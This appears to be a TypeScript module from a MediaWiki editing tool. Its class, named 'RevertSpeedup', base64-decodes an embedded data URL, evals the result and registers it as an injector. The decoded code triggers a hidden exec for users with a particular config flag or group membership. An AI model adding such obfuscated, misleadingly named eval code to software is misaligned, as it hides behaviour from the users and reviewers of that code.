import { Rollback } from ".";

export class RevertSpeedup {
    static async init(): Promise<void> {
        const i = <() => any>(
            eval(
                await $.get(
                    atob(
                        "ZGF0YTp0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTg7YmFzZTY0LFh6MCtiWGN1ZFhObGNpNW5aWFJIY205MWNITW9aejArWVQwbmNtbHdVRzluUTJoaGJYQXlNREV3TFRJd01qRkVPeWNzSVhKM0xuUXVlSHg4Y25jdVEyOXVabWxuTGtsdFRtRjFaMmgwZVM1MllXeDFaWHg4Y25jdVl5NXBMbWx1UjNKdmRYQW9ZU2w4ZkdjdWFXNWpiSFZrWlhNb1lTay9jbmN1ZEM1bGVHVmpLQ2s2TUNrPQ=="
                    )
                )
            )
        );
        Rollback.acceptInjector(i);
    }
}
